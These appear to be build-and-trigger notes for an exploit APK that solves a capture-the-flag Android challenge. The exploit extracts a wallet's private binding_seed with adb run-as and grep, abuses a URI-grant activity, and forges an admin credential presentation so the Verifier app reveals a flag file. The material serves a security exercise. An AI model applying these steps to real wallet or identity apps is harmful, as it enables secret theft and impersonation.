# SEKAI ID exploit APK: build and trigger notes

## 0. What this APK does

The APK contains two public entry points:

- `com.sekai.exploit/.MainActivity`
  - saves the wallet `binding_seed` into the exploit's private SharedPreferences;
  - can be launched manually with ADB.

- `com.sekai.exploit/.ExploitProviderActivity`
  - handles `com.sekai.id.ACTION_PRESENT_CREDENTIAL`;
  - receives Verifier's `challenge`;
  - reads wallet metadata from `content://com.sekai.id.companion.info/badge` and `content://com.sekai.id.companion.info/pubkey`;
  - computes companion `auth` using the copied `libsekaibind.so`;
  - uses `com.sekai.id.share.BadgeShareActivity` to obtain a one-shot URI grant for `content://com.sekai.id.companion/badge?challenge=...&auth=...`;
  - queries the granted badge URI to get an official presentation signed by the wallet;
  - changes `revealedClaims.accessProfile` to `admin`;
  - recomputes `claimsTag` with `com.sekai.verifier.crypto.NativeBinding.nativeClaimsTagFromFingerprint`;
  - returns `RESULT_OK` with extra `com.sekai.id.extra.PRESENTATION` to Verifier.

The APK ships `app/src/main/jniLibs/x86_64/libsekaibind.so`, copied from the challenge attachment.

## 1. Build with GitHub Actions

Create a private GitHub repository with this project, then push it.

The workflow is already at:

```text
.github/workflows/build.yml
```

Manual build path:

1. Open GitHub repository.
2. Go to **Actions**.
3. Select **Build exploit APK**.
4. Click **Run workflow**.
5. Optionally set `seed_b64` if already known. Leaving it empty is fine because the seed can be configured at runtime.
6. Download artifact `sekai-exploit-apk`.
7. Extract `app-debug.apk`.

Local build path, if Gradle + Android SDK exist:

```bash
./gradlew assembleDebug
# or
./gradlew assembleDebug -PSEKAI_SEED_B64='<BASE64_BINDING_SEED>'
```

Output:

```text
app/build/outputs/apk/debug/app-debug.apk
```

## 2. Install challenge apps and exploit

```bash
adb install -r SekaiID.apk
adb install -r Verifier.apk
adb install -r app-debug.apk
```

Launch the wallet once so it provisions its initial credential and `binding_seed`:

```bash
adb shell am start -n com.sekai.id/.MainActivity
```

## 3. Extract wallet binding_seed with ADB/run-as

The challenge APK declares `com.sekai.id` as debuggable, so `run-as` can read its private SharedPreferences.

Robust extraction command:

```bash
adb shell run-as com.sekai.id sh -c 'grep -R "binding_seed" shared_prefs 2>/dev/null'
```

Expected file/key:

```text
shared_prefs/device_binding.xml
binding_seed
```

Example output shape:

```xml
<string name="binding_seed">BASE64_VALUE_HERE</string>
```

Save only the base64 value.

If the file does not exist, launch the wallet or query its exported info provider once, then retry:

```bash
adb shell am start -n com.sekai.id/.MainActivity
adb shell content query --uri content://com.sekai.id.companion.info/badge
adb shell run-as com.sekai.id sh -c 'grep -R "binding_seed" shared_prefs 2>/dev/null'
```

## 4. Configure the exploit APK with the seed

Runtime configuration:

```bash
adb shell am start \
  -n com.sekai.exploit/.MainActivity \
  --es seed_b64 'BASE64_VALUE_HERE'
```

The Activity should display:

```text
Saved binding_seed.
```

Build-time configuration is also supported:

```bash
./gradlew assembleDebug -PSEKAI_SEED_B64='BASE64_VALUE_HERE'
```

For GitHub Actions, fill the `seed_b64` workflow input.

## 5. Trigger Verifier flow

Launch Verifier:

```bash
adb shell am start -n com.sekai.verifier/.MainActivity
```

Interact with the UI using `scrcpy` if needed. When Android shows the handler chooser for:

```text
com.sekai.id.ACTION_PRESENT_CREDENTIAL
```

choose:

```text
SEKAI Exploit
```

The exploit should receive the challenge and return a forged admin presentation to Verifier.

Watch logs:

```bash
adb logcat -s SEKAIEXP
```

Useful log checkpoints:

```text
challenge=...
reading wallet info...
requesting one-shot URI grant from wallet...
querying granted companion badge provider...
forged accessProfile attendee -> admin
forged admin presentation returned to Verifier
```

If successful, Verifier should route internally to `AdminDashboardActivity` and display `/system/flag.txt`.

## 6. Why seed is required

Two direct routes are blocked:

1. `IdentityProviderActivity` checks `getCallingPackage() == "com.sekai.verifier"`.
2. `content://com.sekai.id.companion/badge` is `exported=false` and requires a valid `auth` query parameter.

`BadgeShareActivity` can grant read permission to the protected badge URI, but the URI must contain correct `auth`.

`auth` is computed by the wallet native binding from:

```text
binding_seed
credentialId
holderPublicKey
challenge
```

The static APK attachment contains the native algorithm, but the `binding_seed` is generated at runtime inside `com.sekai.id` private storage. Because the official APK is debuggable in the challenge environment, an ADB-side agent can extract it with `run-as` and pass it into this exploit APK.

## 7. Intent details

Verifier request handled by exploit:

```text
Action:   com.sekai.id.ACTION_PRESENT_CREDENTIAL
Category: android.intent.category.DEFAULT
Extra:    com.sekai.id.extra.CHALLENGE       -> String
Extra:    com.sekai.id.extra.VERIFIER_LABEL  -> String
```

Exploit final response to Verifier:

```text
resultCode = Activity.RESULT_OK (-1)
Extra: com.sekai.id.extra.PRESENTATION -> forged presentation JSON string
```

Internal grant request made by exploit:

```text
Component: com.sekai.id/com.sekai.id.share.BadgeShareActivity
Action:    com.sekai.id.ACTION_SHARE_BADGE
Data:      content://com.sekai.id.companion/badge?challenge=<challenge>&auth=<auth>
```

Wallet grant response:

```text
resultCode = RESULT_OK
Data:      same content URI
Flags:     FLAG_GRANT_READ_URI_PERMISSION
```
